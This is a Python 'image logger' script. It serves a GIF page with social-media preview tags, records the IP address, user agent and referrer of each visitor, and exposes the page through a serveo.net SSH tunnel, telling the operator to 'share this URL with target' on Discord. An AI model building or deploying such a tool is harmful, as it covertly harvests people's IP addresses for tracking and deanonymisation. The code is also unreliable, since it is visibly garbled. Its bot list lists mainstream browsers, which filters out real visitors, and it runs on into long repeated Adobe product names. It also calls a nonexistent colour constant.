import os
import time
import json
import socket
import threading
import webbrowser
import subprocess
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Back, Style, init
from datetime import datetime

init()

TARGET_IMAGE = "https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"

class ImageLoggerHandler(BaseHTTPRequestHandler):
    captured_logs = []
    log_lock = threading.Lock()
    bot_signatures = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'perl',
        'php', 'ruby', 'go-http', 'okhttp', 'httpclient', 'axios', 'requests', 'urllib',
        'robot', 'validator', 'fetcher', 'monitor', 'pingdom', 'uptimerobot', 'newrelic',
        'datadog', 'sentry', 'googlebot', 'bingbot', 'slurp', 'baiduspider', 'yandex',
        'duckduckbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp',
        'telegrambot', 'skypeuripreview', 'bingpreview', 'google-site-verification',
        'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright', 'chromium',
        'firefox', 'safari', 'chrome', 'edge', 'msie', 'trident', 'opera', 'vivaldi',
        'brave', 'duckduckgo', 'archive.org', 'wayback', 'commoncrawl', 'ccbot',
        'petalbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 'mj12bot',
        'blexbot', 'seekport', 'sistrix', 'linkdex', 'linkfluence', 'coccoc',
        'searchmetrics', 'spbot', 'openlinkprofiler', 'sistrix', 'woorank',
        'seobility', 'screaming frog', 'sitebulb', 'deepcrawl', 'on Crawl',
        'botify', 'seomoz', 'moz', 'ahrefs', 'semrush', 'similarweb', 'alexa',
        'compete', 'quantcast', 'chartbeat', 'gauges', 'piwik', 'matomo',
        'hubspot', 'marketo', 'pardot', 'pardot', 'eloqua', 'salesforce',
        'drip', 'intercom', 'drift', 'zendesk', 'freshdesk', 'helpshift',
        'uservoice', 'get Satisfaction', 'zopim', 'olark', 'livechat',
        'tawk.to', 'crisp', 'chatra', 'hubspot', 'intercom', 'zendesk',
        'salesforce', 'servicecloud', 'force', 'pardot', 'marketing cloud',
        'adobe', 'omniture', 'sitecatalyst', 'dtm', 'launch', 'target',
        'audience manager', 'media optimizer', 'campaign', 'experience cloud',
        'creative cloud', 'document cloud', 'acrobat', 'photoshop', 'illustrator',
        'indesign', 'premiere', 'after effects', 'lightroom', 'bridge',
        'dreamweaver', 'muse', 'animate', 'fireworks', 'edge animate',
        'phonegap', 'dreamweaver', 'muse', 'animate', 'fireworks', 'edge',
        'photoshop', 'illustrator', 'indesign', 'premiere', 'after effects',
        'lightroom', 'bridge', 'dreamweaver', 'muse', 'animate', 'fireworks',
        'edge animate', 'phonegap', 'cordova', 'ionic', 'phonegap build',
        'adobe creative cloud', 'adobe document cloud', 'adobe experience cloud',
        'adobe marketing cloud', 'adobe analytics', 'adobe target', 'adobe audience manager',
        'adobe media optimizer', 'adobe campaign', 'adobe experience manager',
        'adobe experience platform', 'adobe cloud platform', 'adobe sensei',
        'adobe stock', 'adobe font', 'adobe color', 'adobe capture', 'adobe lightroom',
        'adobe photoshop', 'adobe illustrator', 'adobe indesign', 'adobe premiere',
        'adobe after effects', 'adobe audition', 'adobe bridge', 'adobe dreamweaver',
        'adobe muse', 'adobe animate', 'adobe fireworks', 'adobe edge', 'adobe phonegap',
        'adobe cordova', 'adobe ionic', 'adobe phonegap build', 'adobe creative cloud',
        'adobe document cloud', 'adobe experience cloud', 'adobe marketing cloud',
        'adobe analytics', 'adobe target', 'adobe audience manager', 'adobe media optimizer',
        'adobe campaign', 'adobe experience manager', 'adobe experience platform',
        'adobe cloud platform', 'adobe sensei', 'adobe stock', 'adobe font', 'adobe color',
        'adobe capture', 'adobe lightroom', 'adobe photoshop', 'adobe illustrator',
        'adobe indesign', 'adobe premiere', 'adobe after effects', 'adobe audition',
        'adobe bridge', 'adobe dreamweaver', 'adobe muse', 'adobe animate',
        'adobe fireworks', 'adobe edge', 'adobe phonegap', 'adobe cordova',
        'adobe ionic', 'adobe phonegap build'
    ]

    @classmethod
    def is_bot(cls, user_agent):
        if not user_agent or user_agent == 'Unknown':
            return True
        ua = user_agent.lower()
        for sig in cls.bot_signatures:
            if sig.lower() in ua:
                return True
        return False

    def do_GET(self):
        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if ImageLoggerHandler.is_bot(user_agent):
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'<!DOCTYPE html><html><body></body></html>')
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        referrer = self.headers.get('Referer', 'Direct')

        with ImageLoggerHandler.log_lock:
            ImageLoggerHandler.captured_logs.append({
                'ip': ip,
                'user_agent': user_agent,
                'timestamp': timestamp,
                'referrer': referrer
            })

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <meta property="og:title" content="Image Logger">
    <meta property="og:image" content="{TARGET_IMAGE}">
    <meta property="og:image:width" content="498">
    <meta property="og:image:height" content="498">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{TARGET_IMAGE}">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        img {{ max-width: 100%; height: auto; max-height: 100vh; object-fit: contain; }}
    </style>
</head>
<body>
    <img src="{TARGET_IMAGE}" alt="logger">
</body>
</html>"""

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                extra = json.loads(post_data.decode('utf-8'))
                with ImageLoggerHandler.log_lock:
                    if ImageLoggerHandler.captured_logs:
                        ImageLoggerHandler.captured_logs[-1].update(extra)
            except Exception:
                pass
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

class ImageLogger:
    def __init__(self, port=8080):
        self.port = port
        self.server = None
        self.server_thread = None
        self.running = False
        self.public_url = None
        self.tunnel_process = None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def try_serveo_tunnel(self):
        try:
            tunnel_cmd = [
                'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=10',
                '-R', f'80:localhost:{self.port}', 'serveo.net'
            ]
            proc = subprocess.Popen(
                tunnel_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self.tunnel_process = proc

            url_pattern = re.compile(r'https?://[^\s]+\.serveo\.net')
            for _ in range(60):
                line = proc.stdout.readline()
                if not line:
                    break
                match = url_pattern.search(line)
                if match:
                    self.public_url = match.group(0)
                    return True
                if 'Could not request' in line or 'Connection refused' in line:
                    break
            return False
        except Exception:
            return False

    def stop_tunnel(self):
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
            except Exception:
                pass
            self.tunnel_process = None

    def start_server(self):
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), ImageLoggerHandler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            tunnel_ok = self.try_serveo_tunnel()
            if not tunnel_ok:
                self.stop_tunnel()
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start server: {e}{Fore.RESET}")
            return False

    def stop_server(self):
        self.stop_tunnel()
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
            self.running = False

    def show_logs(self):
        local_ip = self.get_local_ip()
        local_url = f"http://{local_ip}:{self.port}/track"
        display_url = self.public_url if self.public_url else local_url

        print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} IMAGE LOGGER ACTIVE {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
        print(f"{Fore.YELLOW}{display_url}{Fore.RESET}")
        if self.public_url:
            print(f"{Fore.GREEN}Public tunnel active - Discord preview should work.{Fore.RESET}")
        else:
            print(f"{Fore.AMBER}No public tunnel available. Discord may not show preview.{Fore.RESET}")
        print(f"{Fore.GREEN}Press Ctrl+C or Enter to stop and return to menu...{Fore.RESET}\n")

        try:
            while self.running:
                with ImageLoggerHandler.log_lock:
                    logs = list(ImageLoggerHandler.captured_logs)

                if logs:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} IMAGE LOGGER ACTIVE {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
                    print(f"{Fore.YELLOW}{display_url}{Fore.RESET}")
                    if self.public_url:
                        print(f"{Fore.GREEN}Public tunnel active - Discord preview should work.{Fore.RESET}")
                    else:
                        print(f"{Fore.AMBER}No public tunnel available. Discord may not show preview.{Fore.RESET}")
                    print(f"{Fore.GREEN}Press Enter to stop and return...{Fore.RESET}\n")
                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                    print(f"{Style.BRIGHT}{Fore.WHITE}{'TIMESTAMP':<20} {'IP ADDRESS':<20} {'USER AGENT':<30}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")

                    for log in logs:
                        ua = log.get('user_agent', 'Unknown')[:28] + '...' if len(log.get('user_agent', '')) > 30 else log.get('user_agent', 'Unknown')
                        print(f"{Fore.WHITE}{log['timestamp']:<20} {Fore.GREEN}{log['ip']:<20} {Fore.CYAN}{ua:<30}{Fore.RESET}")

                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                    print(f"{Fore.YELLOW}Total captured: {len(logs)}{Fore.RESET}\n")

                time.sleep(1)

        except KeyboardInterrupt:
            pass
        finally:
            self.stop_server()

    def start_and_monitor(self):
        if not self.start_server():
            input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
            return

        try:
            if self.public_url:
                webbrowser.open(self.public_url)
            else:
                webbrowser.open(f"http://localhost:{self.port}/track")
        except Exception:
            pass

        self.show_logs()

